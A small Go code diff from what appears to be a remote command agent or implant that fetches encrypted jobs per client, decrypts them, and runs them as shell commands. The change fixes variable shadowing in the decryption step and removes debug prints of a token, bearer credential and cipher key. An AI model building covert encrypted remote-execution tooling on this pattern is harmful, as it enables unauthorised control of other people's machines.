@@ -156,14 +156,15 @@ func CheckCommands(t, clientID string) { //This is the main thing, reads the com
 				processedJobIDs = append(processedJobIDs, jobID)
 				fmt.Println(processedJobIDs)
 				/// Run stuff based on type
-				data := []byte{}
+				var data string
+				var err error
 				if encCmd != "" {
-					data, err := crypto.Decrypt(encCmd)
+					data, err = crypto.Decrypt(encCmd)
 					if err != nil {
 						fmt.Println("error:" + err.Error())
 						continue
 					}
-					fmt.Printf("%q\n", data)
+					fmt.Printf("data: %q\n", data)
 				}
 				cmdParser := shellwords.NewParser()
 				cmdParser.ParseEnv = config.ParseEnv
@@ -224,10 +225,6 @@ func RunCommand(clientID string, jobID string, args []string) { //This receives 
 }
 
 func main() { //Main function
-	fmt.Println(config.Token)
-	fmt.Println(config.Bearer)
-	fmt.Println(config.CipherKey)
-
 	// Set config.OSVersion
 	cmd := command.GetCommand("version")
 	if cmd != nil {
